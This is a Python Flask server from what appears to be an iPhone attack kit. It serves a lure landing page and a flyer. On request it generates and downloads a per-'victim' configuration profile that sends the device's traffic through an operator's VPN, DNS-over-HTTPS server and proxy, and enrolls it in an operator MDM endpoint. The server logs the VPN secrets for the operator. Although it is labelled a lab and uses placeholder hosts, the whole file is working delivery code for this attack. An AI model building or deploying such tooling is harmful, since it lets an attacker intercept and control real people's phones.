"""Serves the landing page and generates a per-device .mobileconfig via
download/victimforge.py when someone requests /api/profile.

LAB CONFIGURATION - the LAB_* values below are written into the generated
profile. Edit them (or export LAB_* env vars) BEFORE a test device installs it.
"""
import logging
import os
import subprocess
import sys
import threading
from pathlib import Path

from flask import Flask, Response, send_file, send_from_directory

ROOT = Path(__file__).parent.resolve()   # landing/
REPO = ROOT.parent.resolve()             # repo root: templates/, profiles/, vps/
FORGE = ROOT / "download" / "victimforge.py"

# ----- lab values: REPLACE before a real device connects ------------------
VICTIM_ID  = os.environ.get("LAB_VICTIM", "lab-iphone")
VPS_IP     = os.environ.get("LAB_VPS_IP", "203.0.113.10")           # strongSwan gateway IP
DOH_HOST   = os.environ.get("LAB_DOH_HOST", "doh.lab.invalid")      # DoH endpoint host (needs TLS cert)
PROXY_HOST = os.environ.get("LAB_PROXY_HOST", "proxy.lab.invalid")  # Render fallback proxy host
PROXY_PORT = os.environ.get("LAB_PROXY_PORT", "8080")
MDM_HOST   = os.environ.get("LAB_MDM_HOST", "mdm.lab.invalid")  # MDM/SCEP endpoint (no real server needed for the lab)
APNS_TOPIC = os.environ.get(
    "LAB_APNS_TOPIC",
    "com.apple.mgmt.External.00000000-0000-0000-0000-000000000000",  # fake topic: enrollment will fail - expected lab observation
)
CA_PATH    = Path(os.environ.get(
    "LAB_CA",
    str(REPO / "vps" / "strongswan" / "certs" / "ca-cert.pem"),
))

OUT_DIR       = REPO / "profiles"
OUTPUT_FILE   = OUT_DIR / f"{VICTIM_ID}.mobileconfig"
DOWNLOAD_NAME = f"{VICTIM_ID}.mobileconfig"
TIMEOUT_SECONDS = 60
PLACEHOLDER_NETS = ("203.0.113.", "192.0.2.", "198.51.100.")  # TEST-NET ranges

app = Flask(__name__, static_folder=None)
app.logger.setLevel(logging.INFO)  # keep the strongSwan secret line visible
lock = threading.Lock()          # one victimforge.py run at a time


@app.get("/")
def home():
    return send_from_directory(ROOT, "index.html")


@app.get("/sub.jpeg")
def flyer():
    return send_from_directory(ROOT, "sub.jpeg")


@app.get("/images/<path:name>")
def images(name):
    return send_from_directory(ROOT / "images", name)


@app.get("/api/profile")
def profile():
    # Only these routes are public, so download/victimforge.py itself is never exposed.
    with lock:
        if not CA_PATH.exists():
            app.logger.error(
                "CA certificate not found at %s - generate it first "
                "(vps/strongswan/certs-setup.sh on the VPS, or create a lab CA).",
                CA_PATH,
            )
            return Response("Server CA not configured.", status=500)

        if OUTPUT_FILE.exists():
            OUTPUT_FILE.unlink()  # never serve a stale file

        cmd = [
            sys.executable, str(FORGE),
            "--victim", VICTIM_ID,
            "--vps", VPS_IP,
            "--doh", DOH_HOST,
            "--proxy", PROXY_HOST,
            "--proxy-port", PROXY_PORT,
            "--ca", str(CA_PATH),
            "--mdm", MDM_HOST,
            "--apns-topic", APNS_TOPIC,
        ]
        try:
            run = subprocess.run(
                cmd, cwd=REPO, capture_output=True, text=True,
                timeout=TIMEOUT_SECONDS,
            )
        except subprocess.TimeoutExpired:
            return Response("Profile generation took too long.", status=504)

        if run.returncode != 0:
            app.logger.error("victimforge.py failed:\n%s", run.stderr)
            return Response("Could not generate the profile.", status=500)

        # victimforge.py prints the strongSwan secrets line on stdout -
        # log it so the operator can sync ipsec.secrets on the VPS.
        for line in run.stdout.splitlines():
            if ": EAP " in line or ": SCEP " in line:
                app.logger.info("strongSwan secret: %s", line)

        if not OUTPUT_FILE.exists():
            app.logger.error(
                "victimforge.py ran but %s was not created", OUTPUT_FILE
            )
            return Response("Could not generate the profile.", status=500)

        return send_file(
            OUTPUT_FILE,
            as_attachment=True,
            download_name=DOWNLOAD_NAME,
            mimetype="application/x-apple-aspen-config",
        )


if __name__ == "__main__":
    if VPS_IP.startswith(PLACEHOLDER_NETS) or ".invalid" in DOH_HOST:
        print(
            "WARNING: LAB_* values are still placeholders.\n"
            f"  VPS_IP    = {VPS_IP}\n"
            f"  DOH_HOST  = {DOH_HOST}\n"
            f"  PROXY_HOST= {PROXY_HOST}\n"
            f"  MDM_HOST  = {MDM_HOST}\n"
            "Edit the LAB_* constants in server.py before installing the "
            "profile on a device."
        )
    port = int(os.environ.get("PORT", "5000"))   # Render injects PORT
    app.run(host="0.0.0.0", port=port, debug=False)
